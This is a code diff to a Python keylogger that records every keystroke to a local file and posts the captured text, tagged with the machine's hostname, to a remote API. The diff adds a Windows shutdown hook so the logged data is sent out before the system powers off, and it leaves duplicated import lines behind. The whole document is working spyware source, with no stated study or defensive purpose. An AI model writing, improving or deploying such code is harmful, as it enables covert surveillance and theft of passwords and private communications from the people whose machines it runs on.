@@ -5,39 +5,56 @@
 
 from pynput.keyboard import Listener
 import socket
-
 from apiCall import postRequest
 
 file = "keyLogger.txt"
 
+# Keylogging function
+import win32api
+import win32con
+import socket
+from apiCall import postRequest
+from pynput.keyboard import Listener
 
-## This is a Simple Key Logger.
-# It Saves the Text in the .txt File.
+file = "keyLogger.txt"
+
 def onPressKey(key):
     try:
         with open(file, "a") as f:
             f.write(f'{key.char}')
-    except Exception as e:
+    except AttributeError:
         with open(file, "a") as f:
             f.write(f'[{key}]')
 
-
-# Now here you will read the file and it will send to the API.
-
-def sendDataFromAPI():
+def sendDataToAPI():
     lines = ""
-    with open('keyLogger.txt' , 'r') as f:
+    with open(file, 'r') as f:
         lines = f.readlines()
 
-    desktoId = socket.gethostname()
+    desktopId = socket.gethostname()
 
-    # Here API will be called.
-    postRequest(desktoId,lines)
+    # API call
+    postRequest(desktopId, lines)
+    return True
 
+# This function will be called before the system shuts down.
+def onShutdown():
+    print("System is shutting down... Sending data to API.")
+    sendDataToAPI()
 
+# This function hooks into system shutdown events.
+def shutdownHook():
+    def handler(event):
+        if event == win32con.WM_QUERYENDSESSION:
+            onShutdown()
+            return True
+        return False
 
+    win32api.SetConsoleCtrlHandler(handler, True)
 
+if __name__ == "__main__":
+    shutdownHook()
 
-
-with Listener(on_press=onPressKey) as listener:
-    listener.join()
+    # Start keylogger listener
+    with Listener(on_press=onPressKey) as listener:
+        listener.join()
